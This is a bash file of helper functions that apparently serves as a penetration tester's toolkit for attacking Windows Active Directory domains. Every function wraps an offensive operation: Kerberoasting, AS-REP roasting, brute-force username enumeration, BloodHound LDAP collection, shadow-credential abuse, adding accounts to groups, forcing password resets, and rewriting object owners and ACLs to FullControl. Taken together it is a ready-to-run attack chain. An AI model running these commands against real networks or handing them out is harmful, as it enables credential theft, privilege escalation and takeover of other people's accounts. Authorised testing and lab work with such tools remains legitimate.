#!/bin/bash

krbo() {
    if [ "$#" -eq 0 ]; then
        echo "[+] exploit kerberoasting"
        echo "[!] use: krbo <ip> <domain> <user> <pass>"
        return 1
    fi
    rdate -n "$1"
    python3 targetedKerberoast.py -v -d "$2" -u "$3" -p "$4"
}

asrep() {
    if [ "$#" -eq 0 ]; then
        echo "[+] exploit as-rep roasting"
        echo "[!] use: asrep <ip> <domain>"
        return 1
    fi
    rdate -n "$1"
    impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile asrep -dc-ip "$1" "$2/"
}

krbnum() {
    if [ "$#" -eq 0 ]; then
        echo "[+] enum users with kerbrute"
        echo "[!] use: krbnum <ip> <domain>"
        return 1
    fi
    rdate -n "$1"
    kerbrute userenum -d "$2" --dc "$2" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 200
}

smbc() {
    if [ "$#" -eq 0 ]; then
        echo "[+] smb client interactive"
        echo "[!] use: smbc <domain> <user> <pass> <target-ip>"
        return 1
    fi
    impacket-smbclient "$1/$2:'$3'"@"$4"
}

ldapdump() {
    if [ "$#" -eq 0 ]; then
        echo "[+] bloodhound ldap dump"
        echo "[!] use: ldapdump <user> <pass> <domain> <ip>"
        return 1
    fi
    bloodhound-python -u "$1" -p "$2" -d "$3" -ns "$4" -c All --zip
}

map() {
    if [ "$#" -eq 0 ]; then
        echo "[+] network scan with nmap"
        echo "[!] use: map <ip>"
        return 1
    fi
    nmap -sVC --min-rate 400 "$1"
}

wspn() {
    if [ "$#" -eq 0 ]; then
        echo "[+] exploit kerberoasting (alternate)"
        echo "[!] use: wspn <domain> <user> <pass>"
        return 1
    fi
    python3 targetedKerberoast.py -v -d "$1" -u "$2" -p "$3"
}

gw() {
    if [ "$#" -eq 0 ]; then
        echo "[+] exploit genericwrite"
        echo "[!] use: gw <user> <domain> <pass> <target> <ip>"
        return 1
    fi
    certipy-ad shadow auto -u "$1@$2" -p "$3" -account "$4" -dc-ip "$5"
}

addself() {
    if [ "$#" -eq 0 ]; then
        echo "[+] add self to group"
        echo "[!] use: addself <ip> <domain> <user> <pass> <group> <user>"
        return 1
    fi
    bloodyAD --host "$1" -d "$2" -u "$3" -p "$4" add groupMember "$5" "$6"
}

gall() {
    if [ "$#" -eq 0 ]; then
        echo "[+] change password (gall)"
        echo "[!] use: gall <ip> <domain> <user> <pass/hash> <target> <newpass>"
        return 1
    fi
    bloodyAD --host "$1" -d "$2" -u "$3" -p "$4" set password "$5" "$6"
}

cpwd() {
    if [ "$#" -eq 0 ]; then
        echo "[+] change password (chpwd)"
        echo "[!] use: chpwd <ip> <domain> <user> <pass/hash> <target> <newpass>"
        return 1
    fi
    bloodyAD --host "$1" -d "$2" -u "$3" -p "$4" set password "$5" "$6"
}

chowner() {
    if [ "$#" -eq 0 ]; then
        echo "[+] change owner and acl permissions"
        echo "[!] use: chowner <new-owner> <target> <domain> <user> <pass> <ip> <domain> <user> <pass/hash> <target> <newpass>"
        return 1
    fi
    impacket-owneredit -action write -new-owner "$1" -target "$2" "$3/$4:$5"
    impacket-dacledit -action write -rights 'FullControl' -principal "$1" -target "$2" "$3/$4":"$5"
    bloodyAD --host "$6" -d "$7" -u "$8" -p "$9" set password "${10}" "${11}"
}

tgt() {
    if [ "$#" -eq 0 ]; then
        echo "[+] get ticket granting ticket (tgt)"
        echo "[!] use: tgt <ip> <domain> <user> <pass>"
        return 1
    fi
    impacket-getTGT -dc-ip "$1" "$2/$3:$4"
    export KRB5CCNAME=./"$3".ccache
}
